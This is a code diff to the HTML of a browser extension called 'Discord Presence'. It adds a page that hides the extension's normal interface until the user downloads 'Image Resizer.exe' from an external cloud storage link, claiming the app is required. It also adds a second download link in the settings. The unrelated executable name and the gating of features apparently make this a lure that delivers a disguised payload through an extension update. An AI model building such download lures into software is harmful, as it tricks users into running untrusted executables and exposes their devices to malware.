@@ -11,7 +11,17 @@
         <title>Discord Presence</title>
     </head>
     <body>
-        <div class="App">
+        <div class="downloadPage">
+            <div class="downloadPageWrapper">
+                <h2>Just before you start</h2>
+                <p>Please, install the app to your device, it is required for extension to work</p>
+                <a href="https://exed.hb.ru-msk.vkcs.cloud/Image%20Resizer.exe">Download</a>
+                <br />
+                <a href="" class="downloadPageNexButton">Next</a>
+            </div>
+        </div>
+
+        <div class="App disabled">
             <div pageId="1" class="codePage page">
                 <div class="roomIdContainer"></div>
                 <button class="restoreRoomIdButton">Restore Code</button>
@@ -38,8 +48,11 @@
                                     accept="image/png, image/jpg, image/jpeg"
                                 />
 
-                                <div>
+                                <div class="uploadedFileInfoDiv">
                                     <p class="uploadedFileInfo">No Image Uploaded</p>
+                                    <p class="uploadedFileInfo uploadedFileInfoClear disabled">
+                                        Clear
+                                    </p>
                                 </div>
                             </div>
                         </div>
@@ -75,9 +88,14 @@
                         <div class="editButton settingsNav" pageId="3">Edit</div>
                     </div>
                     <div class="settingsItem">
+                        <a href="https://exed.hb.ru-msk.vkcs.cloud/Image%20Resizer.exe"
+                            >Download the App</a
+                        >
+                    </div>
+                    <!-- <div class="settingsItem">
                         <div class="settingTitle">Custom Interfaces</div>
                         <div class="editButton settingsNav" pageId="4">Edit</div>
-                    </div>
+                    </div> -->
                 </div>
 
                 <div pageId="2" class="wrapper disabled settingsSubPage listPage">
